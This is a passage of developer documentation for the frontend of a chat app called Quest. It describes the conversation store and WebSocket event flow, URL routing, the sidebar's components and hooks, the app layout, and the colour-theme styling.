- Already-seeded fast path: when the conversation store already holds an empty messages array for the id (`isLoaded && messages.length === 0`), the hook treats it as freshly seeded by the shared `seedNewConversation()` util (via `Sidebar.handleNewChat` or `HomeComposer`) and skips the `setLoading(true)` toggle on the safety-net `fetchConversation` call, so `ChatPanel` renders the empty composer immediately instead of falling back to the "Loading conversation..." placeholder
- Hydrates loaded skills from the server via `fetchConversationLoadedSkills()` after loading conversation history; calls the `onLoadedSkills` callback to update `ConversationSkillsContext` state

### Data Flow: Message Send with Conversation Switching

```
1. User sends message in Conversation A
2. useConversation.sendMessage() called
   - Adds optimistic user bubble (optimistic: true) to conversationStore['A']
   - Calls WebSocketManager.sendMessage('A', ...) → persistentWebSocket.send({op:"send_message", ...})
3. Server appends user message → message_appended for A → useConversation('A') REST-fetches the new tail, reconciles the optimistic bubble in place
4. User switches to Conversation B
   - ChatPanel unmounts/remounts with new conversationId
   - useConversation('A') detaches its event handler but stays subscribed to A on the server (TTL keeps it alive); useConversation('B') subscribes to B
   - UI shows Conversation B's messages
5. The persistent WS keeps streaming events for A (text_delta, message_appended)
   - WebSocketManager routes them into conversationStore['A']; useConversation('A')
     is unmounted but the store is updated for when the user returns
   - React does NOT re-render (not subscribed to A)
6. User switches back to Conversation A
   - ChatPanel remounts with conversationId='A'; re-attaches its handler. The server-side sub is already live (refreshed by the singleton's 3-min `setInterval`), so no resync is needed; if the TTL did lapse while away the next `subscribe` reconciles via catchup/resync
7. Run completes
   - send_message_finished envelope; sidebar refreshes via conversation_list_changed
```

### Design Decisions

**Why separate store from React state?**
Per-conversation state needs to persist across component unmounts. A global store ensures messages aren't lost when switching conversations, and WebSocket responses route correctly regardless of which conversation is visible.

**Why useSyncExternalStore instead of useState/useReducer?**
`useSyncExternalStore` is designed for subscribing to external stores. It handles concurrent rendering correctly and provides a clean subscription pattern without the boilerplate of context + reducer.

**Why a singleton persistent WebSocket plus a thin WebSocketManager shim?**
The persistent WS must persist independently of React component lifecycle: it carries every conversation's events plus per-user globals, and reconnect / heartbeat / subscriptions cannot be re-established on every mount. The singleton (`persistentWebSocket`) ensures one socket per browser session, correct subscription bookkeeping, and a single watchdog. `WebSocketManager` survives as a thin compatibility shim so the streaming-text bundling and the legacy callback API (`onStreamComplete`, `onConversationRenamed`) keep working without a sweeping refactor of every consumer.

**Why separate streamingMessages from messages?**
During streaming, we accumulate structured messages (text, tool_use, tool_result, stats) in `streamingMessages`. Only when the stream completes do we transfer them to `messages`. This prevents partial/incomplete messages from appearing in the permanent message list.

**Why per-conversation snapshots instead of a global version counter?**
A global `getSnapshot()` returns a version number that increments on every store change, causing all `useSyncExternalStore` consumers to re-render regardless of which conversation changed.

`getConversationSnapshot(id)` returns the specific conversation's state reference, which `useSyncExternalStore` compares by reference equality. If a different conversation is updated, the reference for the current conversation is unchanged, so the component skips the re-render.

This matters now even more than before: the persistent multiplexed WebSocket means every conversation's transient events flow into the store concurrently, so per-conversation snapshots are the only thing keeping unrelated tabs from re-rendering on every text delta.

## URL-Based Routing

Each conversation has a unique URL, enabling deep linking, page reload, and browser back/forward navigation.

### Route Patterns

- `/` -- Default view, no conversation selected (renders the `HomeComposer` home screen, see ChatPanel / Composer section)
- `/chats/<uuid>` -- Standalone conversation
- `/projects/<project_id>/<convo_uuid>` -- Project conversation
- `/inbox` -- Requests inbox (`RequestsView`; mirrored into the legacy `showRequestsView` context flag)
- `/docs`, `/docs?project=<id>`, `/docs/<id>` -- Quest Docs All Docs view (optionally filtered to one project) and doc viewer; URL-only state parsed by `parseDocsRoute()` in `frontend/src/utils/docsRoute.ts` (see [Quest Docs UI](#quest-docs-ui))

### Key Files

| File | Role |
|------|------|
| `frontend/src/main.tsx` | Wraps `<App />` in `<BrowserRouter>` from `react-router-dom` |
| `frontend/src/App.tsx` | Defines `<Routes>` with three `<Route>` patterns; `AppContent` uses `useParams` and `useNavigate` to sync URL with context state |
| `frontend/src/components/Sidebar.tsx` | Respects URL-driven conversation and project selection via `activeProjectId` from context; auto-drills into project when `activeProjectId` is set from URL params |
| `frontend/src/components/RequestsView.tsx` | Uses `useNavigate()` for "Go to conversation" links, navigating to `/chats/<id>` or `/projects/<pid>/<id>` |
| `frontend/src/components/ChatPanel.tsx` | Accepts `onProjectIdLoaded` callback; when conversation detail reveals a `project_id`, reports it back so App can redirect the URL |
| `frontend/src/hooks/useConversation.ts` | Reads `project_id` from conversation detail API response and fires the `onProjectIdLoaded` callback |
| `chat/routes/conversations.py` | Includes `project_id` in conversation detail responses so the frontend can detect project membership |
| `frontend/src/utils/docsRoute.ts` | `parseDocsRoute()` / `docsListPath()` / `docViewerPath()` for the Quest Docs routes (no context state) |
| `quest.py` | SPA catch-all routes for `/chats/{rest:path}`, `/projects/{rest:path}`, and `/admin/{rest:path}`, plus `/inbox`, `/set-password`, and `/docs` + `/docs/{rest:path}` (`serve_spa_docs`), that serve `index.html` so deep links work on page reload |

### Navigation Flow

Conversation selection and creation now use `navigate()` from `react-router-dom` instead of setting state directly. The URL is the source of truth; a `useEffect` in `AppContent` syncs URL params (`conversationId`, `projectId`) into `NavigationContext` / `ProjectsContext` state so all components stay in sync.

1. User clicks a conversation in the Sidebar (or creates a new one)
2. Sidebar calls `onConversationSelect(id, projectId?)` or `onNewConversation(id, projectId?)`
3. App.tsx calls `navigate('/chats/<id>')` or `navigate('/projects/<pid>/<id>')`
4. React Router updates URL → `useParams` returns new values → `useEffect` syncs to context
5. Components receiving `activeConversationId` and `activeProjectId` from context re-render

### Project Redirect

When a user navigates directly to `/chats/<id>` but the conversation actually belongs to a project, the frontend automatically redirects to `/projects/<pid>/<id>`:

1. `ChatPanel` loads conversation detail via `useConversation` hook
2. The API response from `chat/routes/conversations.py` includes `project_id` if the conversation belongs to a project
3. `useConversation` fires the `onProjectIdLoaded(conversationId, projectId)` callback
4. `handleProjectIdLoaded` in `App.tsx` calls `navigate('/projects/<pid>/<id>', { replace: true })` -- using `replace: true` to avoid a back-button loop

### Backend SPA Support

Since the frontend is a single-page application, direct navigation to `/chats/<uuid>`, `/projects/<pid>/<uuid>`, or `/admin/system-monitor` would return a 404 without server-side support. `quest.py` registers three catch-all routes -- `/chats/{rest:path}`, `/projects/{rest:path}`, and `/admin/{rest:path}` -- (before the `/{filename}` static file fallback) that serve `frontend/dist/index.html` for these URL patterns, allowing React Router to handle the route client-side. The `/admin` catch-all cannot shadow admin API routes because those all live under `/app/api/admin/...`. The Quest Docs routes `/docs` and `/docs/{rest:path}` (`serve_spa_docs`) required moving FastAPI's interactive docs off their defaults, which FastAPI registers in its constructor ahead of every app route: Swagger UI is at `/api-docs` (OAuth2 redirect `/api-docs/oauth2-redirect`), ReDoc at `/api-redoc`, `/openapi.json` unchanged (pinned by `tests/test_spa_docs_routes.py`).

### Design Decisions

**Why URL params as source of truth instead of React state?** URLs enable deep linking (share a conversation URL), page refresh (conversation reloads), and browser history navigation (back/forward buttons). The `useEffect` sync keeps the approach compatible with the existing context-based state management used by Sidebar, ChatPanel, and other components.

**Why `replace: true` on project redirects?** Without `replace`, navigating to `/chats/<id>` would push two history entries (the original `/chats/<id>` and the redirected `/projects/<pid>/<id>`). Using `replace` means the back button goes to the previous page, not the pre-redirect URL.

## Sidebar Component

**Structure.** `Sidebar.tsx` is a shell: the brand bar, the two sliding panels, the update banner, the user bar, the modals, and the cross-list flows (drilling in and out of a project, New Chat, Run Routine, project/routine CRUD follow-ups). Everything else is delegated:

- Data: `hooks/useTopLevelConversations.ts` (paged standalone list -- filters, keyset `loadMore`, stale-while-revalidate `refreshSilently` on `stream complete` / `conversation_list_changed`, in-place renames, optimistic `updateConversations`), `hooks/useProjectConversations.ts` (per-project lists -- on-demand `load`, the 30s visibility-aware poll while drilled, WS refresh of the drilled list, `update` / `seedEmpty`), `hooks/useProjectRoutines.ts` (per-project routines + `routine_list_changed`) and two `hooks/useDocs.ts` instances (the user's own and the drilled project's latest Quest Docs, limit 5, debounced refresh on `doc_list_changed`; disabled while the `docs` gate is closed). Each hook owns its own realtime subscriptions, so the Sidebar has none.
- Row UI state and mutations: `hooks/useConversationListActions.ts` -- one instance per list (open options menu, inline rename, optimistic archive / unarchive / rename against the list's `update`).
- Pure list derivation: `utils/sidebarItems.ts` (`applyConversationFilters`, `groupConversationsByRoutine`, `buildSortedSidebarItems`, `deriveProjectSidebarItems`, `formatRoutineTimestamp`) and `utils/sidebarDocs.ts` (doc row order, compact row time), unit-tested without React.
- Rendering: `components/sidebar/` -- `ProjectsSection`, `DocsSection` (the Docs block, see [Quest Docs UI](#quest-docs-ui)), `ConversationsSection` (header + list + the auto-paging Load more row, whose IntersectionObserver re-observes whenever `loadMore` changes identity), `ProjectPanel` (drill-down header, the project's `DocsSection`, `RoutinesSection`, grouped list), the shared `ConversationRow` (one component for the top-level, project and routine-run rows; the routine-run `variant` shows the run timestamp and has no FLIP id), `ConversationFilterMenu`, `RequestsBadge` and `icons.tsx`. The section components render fragments where the stylesheet uses child selectors (`.sidebar-panel-main > .section-header`, `.drill-down-conversations > .section-header`), so the DOM shape is unchanged.

Behavior checks for the hooks and helpers live beside them (`*.test.ts(x)`, run with `npm test`).

The sidebar provides navigation: a brand bar at the top (app logo + name on the left; a New Chat icon button, a search icon button and a requests inbox icon button with an open-count badge on the right, Cmd/Ctrl+K also opens search), then a Projects section and a Conversations list. The brand bar is placed outside the sliding panels container (`.sidebar-panels`) so it remains visible when the user drills into a project.

Sections are separated by vertical spacing under bold sentence-case headers rather than hairline dividers (the only remaining hairline is the border above the user bar at the bottom), and the sidebar sits on the raised ground (`--surface-raised`, shared with the composer bubble and right-panel cards -- see Colour Scheme and Colour Themes) so a colour theme can tint the chrome separately from the chat ground (design tokens in `frontend/src/index.css`).

Section headers carry their actions on the right: the Conversations header (top level and inside a project) has a `+` New Chat icon button plus a vertical-ellipsis options menu holding the Show Archived / Show Slack / Show Inference API toggles -- there is no inline New Chat row in the list anymore; the project Routines header always shows its `+` New Routine button, even when the project has no routines yet.

Conversation and routine rows share one compact text style (0.825rem, weight 400, 6px vertical padding) so a project's Routines and Conversations read as one list; inside the phone drawer (`MobileShell.css`, `.mobile-drawer` scope) rows get 0.875rem text and 8px vertical padding for larger tap targets. The scrollable panels and the chat messages container carry a transparent right border so their scrollbars sit inset from the edge instead of flush against it.

### Implemented Components

#### 1. RequestsBadge Component (`src/components/Sidebar.tsx`)

Self-contained component that fetches the open action request count. Extracted as a separate component so that count changes only re-render the badge, not the entire Sidebar.

**Refresh Behavior**:
- Mounts with a single `fetchActionRequestCounts()` call and renders the `counts.open` value
- Subscribes to `request_count_changed` envelopes on the persistent WebSocket via `persistentWebSocket.onGlobalEvent(...)` and updates the badge in place when the event arrives -- across tabs, devices, or after a server-side resolve
- Subscribes to the local same-tab `onRequestCountChange()` from `frontend/src/services/requestEvents.ts` for instant feedback on a click in this tab; the persistent-WS event arrives milliseconds later and is idempotent
- Renders nothing when count is 0

The previous 30-second `setInterval` plus `visibilitychange` re-fetch was removed in devplan 00062.

**Event Sources**: The local `emitRequestCountChange()` is fired in the same tab from:
- `frontend/src/services/WebSocketManager.ts` -- when an `action_request` event arrives on the persistent WS (new request created by the agent)
- `frontend/src/components/ActionRequestMessage.tsx` -- after approving / revising / denying an inline action request
- `frontend/src/components/RequestsView.tsx` -- after approving / revising / denying a request in the Requests pane

Cross-tab updates flow exclusively through the persistent-WS `request_count_changed` event published by the action-request resolve endpoint and the `create_action_request` dispatch handler (`chat/gemini_api/turn_tools.py`).

#### 2. Sidebar Component (`src/components/Sidebar.tsx`)

A sidebar component that displays projects, conversations, a Requests section, and provides navigation. Wrapped with `React.memo` so it only re-renders when its props actually change. Combined with `useCallback`-stabilized callback props from `App.tsx`, this prevents the Sidebar from re-rendering when the parent re-renders with unchanged props. Subscribes to `webSocketManager.onConversationRenamed` to update conversation names in real-time when the model sets a name via the `set_conversation_name` tool.

**Props Interface** (see `SidebarProps` in `frontend/src/components/Sidebar.tsx`):
- `activeConversationId`: Currently selected conversation (string or null)
- `onConversationSelect`: Callback when a conversation is clicked
- `onNewConversation`: Callback when a new conversation is created
- `onNavigateAway` (optional): called after the Sidebar navigates to a non-conversation view (a doc, All Docs); `MobileShell` passes a drawer-closing callback, the desktop layout passes nothing

**Features**:
- Automatic conversation and project list fetching on mount
- Brand bar (`.sidebar-brand`) at the top of the sidebar: the `QuestLogo` mark + `appName` on the left, and two icon buttons on the right -- a search magnifier that opens the `SearchModal` (also toggled by the Cmd/Ctrl+K keyboard shortcut) and a requests inbox tray (Lucide `Inbox`) that activates the `RequestsView` in the main content area (via `setShowRequestsView` in `NavigationContext`).
  - The inbox button carries the `RequestsBadge` component pinned to its top-right corner (open action request count via event-driven refresh, see above; renders `9+` above nine) and takes an accent `active` state while the Requests view is showing.
  - Positioned outside `.sidebar-panels` so it stays visible when drilled into a project
- Layout: the brand bar sits above the sliding panels container; within the panels, there is a Projects section (always visible) and Conversations list, separated by spacing under bold headers (no hairline dividers)
- Projects section shows a dotted-border "Create Project" button when no projects exist; when projects exist, a "+" button appears in the section header for creating new projects
- Project entries display folder icons and right-pointing navigation chevrons
- Clicking a project triggers a slide-left animation revealing the project's drill-down view (Routines section + Conversations section), with a back button to return to the main sidebar view.
  - Drilling in saves the current top-level conversation ID to a ref (`previousTopLevelConversationId`) and auto-selects the project's latest conversation (or shows an empty state if the project has no conversations). Drilling back restores the previously selected top-level conversation (or shows an empty state if none was selected before).
  - When `activeProjectId` is set from URL params (e.g., navigating to `/projects/<pid>/<id>`), the sidebar auto-drills into the corresponding project via a `useEffect`.
  - The drilled-project id itself (`drilledProjectId`) lives in `ProjectsContext` rather than Sidebar-local state so the root HomeComposer can target its first send at the drilled project (see the Home Screen section)
- Routines section (always visible in project drill-down): shows a "Create Routine" button when empty, a "+" button in section header when routines exist; each routine entry has a play button and a settings gear icon; see [Routines Architecture](../architecture/routines.md) for details
- "New Chat" buttons (brand bar icon, the top-level Conversations header `+`, and the project drill-down Conversations header `+`) do NOT create a conversation. They navigate to `/` so the root [Home Screen](#home-screen-homecomposer) composer is shown, and the conversation is created as a response to the first message (`handleNewChat` / `handleNewProjectChat` in `frontend/src/components/Sidebar.tsx`; the phone top-bar new-chat button in `MobileShell.tsx` does the same).
  - While the Sidebar is drilled into a project, both the brand-bar pencil (`handleBrandBarNewChat`) and the project `+` keep the Sidebar drilled so the home composer creates the chat inside that project (the pencil is titled "New chat in this project" in that state); otherwise the target is a standalone chat.
  - Only "Duplicate Workspace" and routine runs still pre-create a conversation on this tab: they call the shared `seedNewConversation()` helper in `frontend/src/utils/newConversation.ts` (also used by `HomeComposer`).
  - It primes `conversationStore.setMessages(id, [])`, `setLoadedSkillsForConversation(id, [])`, and `persistentWebSocket.setLastSeq(id, 0)` from the create response (see [Chat API -- Create Conversation](../api/chat-api.md)) before navigating, so `ChatPanel` paints the empty composer on the first commit instead of stalling on the "Loading conversation..." placeholder.
  - The sidebar list refresh is fire-and-forget (`void silentLoadConversations()` for duplicate-workspace, `void loadProjectConversations(projectId, /* silent */ true)` for routine runs); the canonical refresh signal is the `conversation_list_changed` WS event from the create endpoint's `_publish_list_changed()`. See `handleDuplicateWorkspace` and `handleRunRoutine` in `frontend/src/components/Sidebar.tsx`
- Active conversation highlighting with visual indicator
- Compact conversation entries (title only, no message count or timestamp)
- Conversation archive: meatball menu (three-dot icon) on each conversation entry offering Archive/Unarchive and Rename actions. Archived conversations appear dimmed and italic when the filter makes them visible
- Conversation list filter: filter icon button (lucide `Filter`) in each Conversations section header opens a popover with checkboxes ("Show Archived", "Show Slack Conversations", and top-level only "Show Inference API Runs"). All default to unchecked on every page load (no persistence) and unchecked means hide that category.
  - For the top-level list all three filters are enforced server-side via `GET /conversations` query params (`include_archived`, `include_slack`, `include_inference`; see [Chat API](../api/chat-api.md)); `applyConversationFilters()` is kept as an instant client-side pass so unchecking hides rows immediately while the refetch (triggered by the toggle-change effect) restores a full page and reveals newly included rows.
  - The project drill-down list still filters Slack client-side. Separate filter state for the top-level list and the project drill-down list
- Paged top-level conversation list: the top-level Conversations section fetches `CONVERSATIONS_PAGE_SIZE` (30) rows at a time with `exclude_projects=true` (project conversations are never rendered there) instead of the user's entire history.
  - Older pages auto-load as the user scrolls: an `IntersectionObserver` (150px `rootMargin` prefetch, re-observed on every page append so a still-visible pager keeps paging until it leaves the viewport or the cursor runs out) watches the "Load more" row at the bottom of the list, which stays clickable as a manual fallback; each page is fetched via the response's `next_cursor` keyset cursor and appended deduped by id.
  - Background refreshes (WS `conversation_list_changed` / stream-complete) re-fetch the window the user has already loaded (`max(loadedCount, page size)`), reading the current filter toggles through `topFiltersRef` so long-lived WS closures never refetch with stale filter state; toggling a filter resets to page one.
  - The drilled project list refreshes the same way on those events (`loadProjectConversations(id, /* silent */ true)`, stale-while-revalidate): the non-silent loader is reserved for the initial drill-in and the project archive-filter toggle, because it swaps the whole drill-down panel (routines + rows) for a "Loading..." placeholder
- Animated re-sorts: when a background refresh re-orders the list (a conversation with new activity jumps to the top), rows glide to their new slot instead of snapping, via the FLIP hook `useFlipListAnimation` in `frontend/src/hooks/useFlipListAnimation.ts`.
  - The container ref goes on `.conversation-list` (one ref each for the top-level list and the drilled project list, whose routine groups carry a `routine-group-<id>` flip id), each row carries `data-flip-id={conversation.id}`, and the hook measures container-relative row tops on every commit (deliberately no dep array: rendered order can change without a prop identity change) and plays a `translateY` Web Animations API tween (250ms ease-in-out) for rows that moved.
  - Newly mounted rows don't animate and `prefers-reduced-motion` disables it entirely
- Conversation rename: meatball menu "Rename" option triggers an inline text input replacing the conversation title. The input is pre-selected for immediate typing. Press Enter to save, Escape to cancel. Custom names are stored in the `custom_name` column on the `Conversation` model (max 100 chars). Custom names take priority over auto-generated titles. For routine sub-item conversations, custom names display with the timestamp in parentheses after (e.g., "Custom Name (2:30 PM)"). Clearing the name (empty input) reverts to the auto-generated title
- Project conversation polling: when drilled into a project, the sidebar polls `fetchProjectConversations()` every 30 seconds to pick up conversations created server-side by scheduled routines. Polling skips when the browser tab is hidden (`document.hidden`) and triggers an immediate refresh when the tab becomes visible again via `visibilitychange` event. An in-flight guard (`pollInFlightRef`) prevents overlapping fetches. Errors are silently logged since the user did not initiate the request. The interval is defined as `PROJECT_CONVERSATIONS_POLL_INTERVAL_MS` (30,000 ms) at the top of the file
- Version update banner: when `updateAvailable` is `true` (from `AppConfigContext`), renders a sticky orange banner between the sidebar panels and the user info bar saying "Quest has updated. Please reload ASAP!" with a clickable "reload" link that calls `window.location.reload()`
- Loading state ("Loading conversations...")
- Error state with user-friendly error messages
- Empty state ("No conversations yet. Start a new chat!")
- Click handlers for conversation and project selection

**State Management**:
- `conversations`: List of standalone conversations from API
- `projects`: List of projects from API
- `loading`: Whether data is being fetched
- `error`: Error message to display (or null)
- `creating`: Whether a new conversation is being created
- `activeProject`: Currently selected project (for drill-down view)
- `showArchivedTop` / `showArchivedProject`: Whether archived conversations are shown in the top-level / project drill-down list (drives the `include_archived` query param on fetch)
- `showSlackTop` / `showSlackProject`: Whether Slack-origin conversations are shown in the top-level / project drill-down list (top-level: server-side via `include_slack` + instant client-side pass; project list: client-side via `applyConversationFilters()`)
- `showInferenceTop`: Whether Inference-API-origin conversations are shown in the top-level list (server-side via `include_inference` + instant client-side pass)
- `nextCursor` / `loadingMore`: Keyset cursor for the next older page of the top-level list (null when fully loaded; drives the "Load more" button) and its in-flight flag
- `topFiltersRef` / `loadedCountRef`: Refs mirroring the top-level filter toggles and the loaded-row count so background refreshes from long-lived WS closures use current filters and preserve the loaded page window
- `filterMenuOpenTop` / `filterMenuOpenProject`: Whether the filter popover is open in each section
- `openMenuConversationId`: ID of the conversation whose meatball menu is currently open (or null)
- `renamingConversationId`: ID of the conversation currently being renamed (or null); controls inline rename input visibility
- `previousTopLevelConversationId`: Ref storing the conversation ID that was active before drilling into a project, used to restore context on drill-down back
- `pollInFlightRef`: Ref guard preventing overlapping project conversation poll fetches
- `showNewRoutineModal`: Whether the NewRoutineModal is open
- `settingsRoutine`: The routine whose RoutineSettingsModal is open (or null)

#### 3. Sidebar Styling (`src/components/Sidebar.css`)

Comprehensive CSS styles with dark/light mode support:

**Layout**:
- Fixed width: 260px
- Full viewport height: 100vh
- Flexbox column layout
- Raised-ground background (`--surface-raised` token, the theme's nav/composer/panel colour; identical to the chat ground in the prototype light scheme) with only a faint right edge (`--border`); all colours come from the design tokens declared on `:root` in `frontend/src/index.css` (dark values on `:root`, light overrides in the `prefers-color-scheme: light` block), so the stylesheet has no separate light-mode block
- `.sidebar-content` uses `display: flex; flex-direction: column` with the brand bar as a direct child above `.sidebar-panels`
- `.sidebar-panels` uses `flex: 1; min-height: 0; overflow: hidden` to fill remaining space below the brand bar
- Rows (projects, conversations, routine groups, New Chat, Load more) are inset rounded pills (`margin: 0 0.5rem; border-radius: 8px`); the active conversation uses an `--accent-soft` fill instead of a left border
- Section headers (`.section-label`) are bold sentence-case text; sections get vertical margin instead of `border-bottom` hairlines

**Brand Bar** (`.sidebar-brand`):
- Direct child of `.sidebar-content`, positioned above `.sidebar-panels` so it remains visible when drilled into a project
- Left: `.sidebar-brand-logo` (the shared `QuestLogo` component in `components/QuestLogo.tsx` -- a hexagon ring of five rounded segments with the bottom-right sector filled by a full accent wedge, every piece filled by one shared whisper-subtle diagonal wash (a userSpaceOnUse gradient from `--logo-grad-from` top-left to `--logo-grad-to` bottom-right, both color-mix-derived from `--accent` in index.css, with the ring's faded tints from per-path fill-opacity 35% / 50% alternating for texture), so the mark follows the active colour theme and scheme; `public/favicon.svg` and the PNG app icons carry the same geometry and wash with fixed electric-blue colours) + `.sidebar-brand-name` (`appName`)
- Right: two `.sidebar-icon-button`s -- search (opens `SearchModal`, `frontend/src/components/SearchModal.tsx`; also Cmd/Ctrl+K) and the requests inbox (activates `RequestsView`); `.requests-badge` is absolutely positioned on the inbox button's top-right corner with a `--surface` ring; `.active` gives the inbox button the accent tint; mouse clicks leave no focus ring (`:focus:not(:focus-visible)`)

**Projects Section**:
- Always visible section with "Projects" header
- "+" button in header when projects exist (creates new project)
- Dotted-border "Create Project" button when empty
- Project entries with folder icon and right-pointing chevron
- Slide-left animation for project drill-down view
- Back button to return from project conversations to main sidebar

**Routines Section** (within project drill-down):
- Always visible section with "Routines" header
- "+" button in header when routines exist (opens NewRoutineModal)
- Dotted-border "Create Routine" button when empty (opens NewRoutineModal)
- Routine entries with name, settings gear icon (opens RoutineSettingsModal), and play button
- Clock icon indicator for scheduled routines

**Version Update Banner**:
- Sticky orange banner (`.version-update-banner`) rendered between `.sidebar-panels` and `UserInfoBar` when a server version change is detected
- Contains a "reload" link that triggers a page refresh
- Dark/light mode color variants

**Conversations List**:
- "New Chat" inline button at the top of the list
- Scrollable container with custom scrollbar
- 6px width scrollbar with rounded thumb
- Hover effects on scrollbar (opacity changes)
- Flexbox flex-grow to fill remaining space

**Conversation Items**:
- Compact layout with title only (no message count or timestamp)
- Left border indicator for active state
- Background color transitions on hover
- Active state: blue background tint + blue left border
- Title with ellipsis overflow
- Meatball menu button (three-dot icon) appears on hover, opens a dropdown with Rename and Archive/Unarchive actions
- Inline rename input: replaces the title text when renaming; pre-selected text, Enter to save, Escape to cancel
- Archived conversations: dimmed opacity and italic title text when they are shown (filter popover "Show Archived" checked)

**Conversation List Filter**:
- Filter icon button (lucide `Filter`) in each Conversations section header opens a small popover with two checkboxes: "Show Archived" and "Show Slack Conversations". Both default to unchecked on every page load (component-local `useState`, no localStorage/URL/server persistence); unchecked means hide that category
- Separate filter state and popover state for the top-level list and the project drill-down list, so each section is filtered independently
- Popover follows the same inline-dropdown pattern as the conversation meatball menu: absolutely positioned below the icon, dismissed by a `document.addEventListener('click', ...)` click-outside handler, with `e.stopPropagation()` on the button to prevent immediate close on open
- Archive filter is server-driven: the "Show Archived" checkbox is passed through to `fetchConversations(includeArchived)` / `fetchProjectConversations(projectId, includeArchived)` via the `showArchivedTop` / `showArchivedProject` state, and toggling triggers a list reload
- Slack filter is client-side: `applyConversationFilters()` in `frontend/src/components/Sidebar.tsx` composes the archive and Slack predicates against the fetched list. Used by the top-level list, the project ungrouped list, and the routine-grouped sub-items so all three listing surfaces respect the filter
- The `SlackConversationIcon` still renders next to Slack-origin entries regardless of the filter so the user can identify them when "Show Slack Conversations" is checked
- CSS classes `.conversation-filter-button`, `.conversation-filter-menu`, and `.conversation-filter-menu-item` in `frontend/src/components/Sidebar.css`, with a light-mode override block

**States**:
- Loading: Centered text with reduced opacity
- Error: Red text (#ff6b6b in dark mode, #d32f2f in light mode)
- Empty: Centered help text with reduced opacity
- Hover: Subtle background highlight
- Active: Blue accent color with background tint

**Light Mode Support**:
Uses `@media (prefers-color-scheme: light)` to adapt:
- Light background (#f5f5f5)
- Dark text colors
- Adjusted opacity values for contrast
- Same interactive states with inverted colors
- Meatball menu and toggle switch adapted for light mode

#### 4. App Integration (`App.tsx`)

The main App component orchestrates the sidebar and content area. Uses `react-router-dom` for URL-based conversation routing (see URL-Based Routing section below for full details).

**State Management**:
Authentication is handled by `AuthContext` using session cookies. The App component receives `isAuthenticated`, `isCheckingAuth`, and `activeConversationId` from context. URL params are the source of truth for active conversation and project; a `useEffect` syncs them into context state.

**Layout Structure**:
```
app-container
├── Sidebar (260px fixed width)
│   ├── sidebar-content (flex column)
│   │   ├── Brand bar (logo + app name; search icon button; requests inbox icon button with open-count badge)
│   │   ├── sidebar-panels (flex: 1, slides between main and project drill-down)
│   │   │   ├── Projects section (always visible)
│   │   │   │   ├── "Create Project" button (when empty) or "+" button in header
│   │   │   │   └── Project entries (folder icon + chevron, click for drill-down)
│   │   │   │       └── Drill-down view:
│   │   │   │           ├── Routines section (always visible)
│   │   │   │           │   ├── "Create Routine" button (when empty) or "+" in header
│   │   │   │           │   └── Routine entries (name + gear icon + play button)
│   │   │   │           └── Conversations section
│   │   │   └── Conversations list
│   │   │       ├── "New Chat" inline button
│   │   │       └── Conversation entries (compact, title only)
│   │   ├── Version update banner (orange, shown when server version changes)
│   │   └── UserInfoBar (email, admin wrench menu for admins, settings button)
├── SearchModal (overlay, toggled by Cmd/Ctrl+K or sidebar Search click)
└── main-content (flex-grow fills remaining space)
    ├── RequestsView (if showRequestsView is true)
    ├── Quest Docs view (if a /docs route and showRequestsView is false; no file browser)
    ├── Chat panel + File browser (if conversation selected and showRequestsView is false)
    └── HomeComposer (if no conversation and showRequestsView is false)
```

**Callback Handlers**:
- `handleConversationSelect(id, projectId?)`: Navigates to the appropriate URL (`/chats/<id>`, `/projects/<pid>/<id>`, or `/`) instead of setting state directly. Wrapped in `useCallback` to stabilize the reference and prevent Sidebar re-renders
- `handleNewConversation(id, projectId?)`: Navigates to the appropriate URL after creation. Wrapped in `useCallback` to stabilize the reference and prevent Sidebar re-renders
- `handleProjectIdLoaded(conversationId, projectId)`: Redirects `/chats/<id>` to `/projects/<pid>/<id>` when the conversation detail response reveals the conversation belongs to a project (uses `replace: true` to avoid a back-button loop)

### Component Architecture Patterns

#### 1. Callback Props
Parent-child communication via callback props:
```typescript
// Parent passes callbacks
<Sidebar onConversationSelect={handleSelect} />

// Child invokes callbacks
function handleClick() {
  onConversationSelect(conversation.id);
}
```

#### 2. Conditional Rendering
Multiple rendering paths based on state:
```typescript
if (!isAuthenticated) { window.location.href = '/auth/'; return null; }
if (loading) return <LoadingState />;
if (error) return <ErrorState />;
if (isEmpty) return <EmptyState />;
return <NormalState />;
```

#### 3. CSS Module Pattern
Component-specific CSS files imported as side effects:
```typescript
import './Sidebar.css';
```

Classes are plain strings (not CSS modules):
```typescript
<div className="sidebar">
  <div className="conversation-item active">
```

### State Flow Diagram

```
User Opens App
       ↓
isCheckingAuth = true → Show "Loading..."
       ↓
checkSession() calls GET /app/api/me (with cookie)
       ↓
Session valid? ──NO──→ Show inline SignInScreen
    │
   YES
    ↓
isAuthenticated = true, store userEmail/userName
    ↓
Render Sidebar + Main Content
    ↓
Sidebar.useEffect() → fetchConversations()
    ↓
Display conversation list
    ↓
User clicks conversation
    ↓
onConversationSelect(id) → setActiveConversationId(id)
    ↓
Main content shows chat panel
```

### Styling Approach

#### 0. Colour Scheme and Colour Themes
Dark values live on `:root` in `frontend/src/index.css` with light overrides in a `prefers-color-scheme: light` block; component stylesheets either use those tokens or carry their own light block. The user-selectable scheme override (Settings > Appearance, `<html data-theme>`) is applied purely at build time by `frontend/themeOverridePlugin.ts`, so stylesheets never reference `data-theme` themselves.

On top of the scheme sits a user-selectable **colour theme** (Settings > Appearance > Theme, `<html data-color-theme>`, helpers in `frontend/src/utils/colorTheme.ts`, palettes in `frontend/src/themes.css`). A theme swaps the *theme-controlled* tokens for both schemes at once (each theme carries its own dark and light values, adjusted for contrast):

- the accent family -- `--accent` (solid fills/links), `--accent-rgb` (space-separated RGB so tints derive via `rgb(var(--accent-rgb) / a)`), `--accent-hover`, `--accent-contrast` (text on a solid accent fill), `--accent-text` (accent used as text, contrast-tuned)
- the grounds -- `--surface` (chat/content ground) and `--surface-raised` (nav sidebar, phone drawers, composer bubble, right-panel cards; the sidebar deliberately sits on the raised ground so a theme can tint the chrome separately from the chat), plus `--surface-overlay` (menus)

The neutral chrome tokens (`--text*`, `--border*`, `--hover`, and the derived `--logo-grad-from`/`--logo-grad-to` stops of the `QuestLogo` mark's diagonal wash) may also be tuned.

The `:root` defaults in `index.css` ARE the `prototype` theme (indigo `#646cff` on neutral greys).

